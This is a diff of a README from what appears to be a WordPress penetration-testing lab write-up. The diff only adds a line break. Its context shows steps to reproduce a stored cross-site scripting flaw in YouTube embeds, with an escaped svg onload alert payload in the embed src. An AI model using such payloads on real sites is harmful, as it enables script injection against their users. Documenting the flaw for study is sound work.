@@ -89,7 +89,7 @@ Time spent: 8 hours spent in total
   <img src="https://github.com/leveewasbry/WordPress-PT/blob/master/giphy.gif" width="200">
   - [ ] Steps to recreate: <br />
 	1. In a post or comment, paste a YouTube URL with an embed code.
-	[embed src='https://www.youtube.com/embed/du-TY1GUFGk'][/embed]
+	[embed src='https://www.youtube.com/embed/du-TY1GUFGk'][/embed] <br />
 	2. Insert an XSS script before before the end of the code.
 	[embed src='https://www.youtube.com/embed/du-TY1GUFGk\x3csvg onload=alert("hax")\x3e'][/embed]
 	<img src="https://github.com/leveewasbry/WordPress-PT/blob/master/WP%20Github%20writeup/Youtube%20Embeds/Screen%20Shot%202019-11-07%20at%2010.07.45%20PM.png" width="800">
